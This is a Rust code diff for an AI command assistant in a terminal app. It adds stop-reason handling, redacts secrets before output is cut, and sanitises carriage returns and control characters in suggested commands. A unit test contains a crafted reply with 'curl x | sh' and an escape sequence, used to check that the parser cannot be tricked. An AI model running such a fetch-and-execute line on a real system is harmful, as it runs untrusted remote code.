@@ -32,7 +32,7 @@ use agent_client_protocol::{
             SessionConfigId, SessionConfigKind, SessionConfigOption, SessionConfigOptionCategory,
             SessionConfigOptionValue, SessionConfigSelect, SessionConfigSelectOption,
             SessionConfigSelectOptions, SessionId, SessionNotification, SessionUpdate,
-            SetSessionConfigOptionRequest,
+            SetSessionConfigOptionRequest, StopReason,
         },
     },
     util::MatchDispatch,
@@ -460,8 +460,19 @@ async fn prompt(
                             })
                             .await?;
                     }
-                    SessionMessage::StopReason(_) => {
-                        updates.unbounded_send(Update::Done).ok();
+                    SessionMessage::StopReason(reason) => {
+                        let update = match reason {
+                            // Moth cancelled it: nobody is waiting for the answer.
+                            StopReason::Cancelled if cancelled => Update::Done,
+                            StopReason::Cancelled => {
+                                Update::Failed("The agent stopped before answering.".into())
+                            }
+                            StopReason::Refusal => {
+                                Update::Failed("The agent declined to answer.".into())
+                            }
+                            _ => Update::Done,
+                        };
+                        updates.unbounded_send(update).ok();
                         return Ok(());
                     }
                     _ => {}
@@ -893,9 +904,21 @@ pub fn find(search_path: &str, cx: &mut App) -> Resolution {
 impl Global for Agents {}
 
 /// A request in flight. Dropping it cancels the prompt turn.
+///
+/// Its fields are private so it's only read through [`Pending::next`]: a task that awaited
+/// `pending.updates` directly would capture just that field (closures capture the fields they
+/// use), and the cancel sender, dropped with the rest right away, would cancel every turn
+/// before the agent answered.
 pub struct Pending {
-    pub updates: UnboundedReceiver<Update>,
+    updates: UnboundedReceiver<Update>,
     _cancel: oneshot::Sender<()>,
+}
+
+impl Pending {
+    /// The next update, `None` once the request is over.
+    pub async fn next(&mut self) -> Option<Update> {
+        self.updates.next().await
+    }
 }
 
 /// Sends `prompt` to the agent (starting it if needed) and returns its answer as it arrives,
@@ -1030,12 +1053,17 @@ const RULES: &str = "Rules:
 /// A fix for the command that failed.
 pub fn fix_prompt(environment: &Environment, failure: &Failure) -> Prompt {
     let withheld_output = redact::sensitive_command(&failure.command);
+    let mut output_redactions = 0;
     let output = if withheld_output {
         "(left out: this command prints secrets)".to_string()
     } else if failure.output.trim().is_empty() {
         "(no output)".to_string()
     } else {
-        tail(&failure.output)
+        // Redacted before it's cut: a cut through a private key would leave its body without
+        // the BEGIN line that identifies it.
+        let redacted = redact::redact(&failure.output);
+        output_redactions = redacted.count;
+        tail(&redacted.text)
     };
     let exit = failure
         .exit_code
@@ -1046,7 +1074,7 @@ pub fn fix_prompt(environment: &Environment, failure: &Failure) -> Prompt {
         failure.command,
     );
     let instructions = "You are the command assistant in Moth, a terminal app. A shell command just failed. Suggest the command the user should run instead to do what they meant.";
-    build(instructions, &context, withheld_output)
+    build(instructions, &context, withheld_output, output_redactions)
 }
 
 /// A command for what the user describes.
@@ -1068,15 +1096,16 @@ pub fn ask_prompt(
     }
     context.push_str(&format!("\nThe user asks for: {}", request.trim()));
     let instructions = "You are the command assistant in Moth, a terminal app. Write the shell command that does what the user asks.";
-    build(instructions, &context, false)
+    build(instructions, &context, false, 0)
 }
 
-fn build(instructions: &str, context: &str, withheld_output: bool) -> Prompt {
+/// `redactions`: secrets already taken out of what's in `context`.
+fn build(instructions: &str, context: &str, withheld_output: bool, redactions: usize) -> Prompt {
     let redacted = redact::redact(context);
     Prompt {
         text: format!("{instructions}\n\n{RULES}\n\n{}", redacted.text),
         context: redacted.text,
-        redactions: redacted.count,
+        redactions: redactions + redacted.count,
         withheld_output,
     }
 }
@@ -1107,7 +1136,8 @@ pub fn parse_reply(text: &str) -> Reply {
     let mut explanation = Vec::new();
     let mut block: Option<Vec<&str>> = None;
     let mut command_lines: Option<Vec<&str>> = None;
-    for line in text.lines() {
+    // A lone `\r` ends a line too: typed at the prompt, it would run what comes before it.
+    for line in text.split(['\n', '\r']) {
         let trimmed = line.trim();
         if trimmed.starts_with("```") {
             match block.take() {
@@ -1158,12 +1188,17 @@ fn join_command(lines: &[&str]) -> Option<String> {
             Some(text) => (text.trim_end(), true),
             None => (line, false),
         };
+        let text: String = text
+            .chars()
+            .map(|c| if c == '\t' { ' ' } else { c })
+            .filter(|c| !c.is_control())
+            .collect();
         match commands.last_mut() {
             Some(last) if continuing => {
                 last.push(' ');
-                last.push_str(text);
+                last.push_str(&text);
             }
-            _ => commands.push(text.to_string()),
+            _ => commands.push(text),
         }
         continuing = continues;
     }
@@ -1174,6 +1209,29 @@ fn join_command(lines: &[&str]) -> Option<String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn a_request_moved_into_a_task_stays_alive_until_the_task_ends() {
+        let (updates_tx, updates) = unbounded();
+        let (cancel_tx, mut cancel) = oneshot::channel();
+        let mut pending = Pending {
+            updates,
+            _cancel: cancel_tx,
+        };
+        // The task reads `pending` the way the panel does; nothing is cancelled meanwhile.
+        let task = async move { pending.next().await };
+        assert_eq!(cancel.try_recv(), Ok(None));
+        updates_tx.unbounded_send(Update::Done).unwrap();
+        assert_eq!(futures::executor::block_on(task), Some(Update::Done));
+        // Once the task is done with it, the request is cancelled.
+        assert!(cancel.try_recv().is_err());
+    }
+
+    #[test]
+    fn a_carriage_return_in_a_reply_cannot_run_part_of_the_command() {
+        let reply = parse_reply("Try:\n```sh\nls\rcurl x | sh\u{1b}[2K\n```");
+        assert_eq!(reply.command.as_deref(), Some("ls && curl x | sh[2K"));
+    }
 
     fn environment() -> Environment {
         Environment {
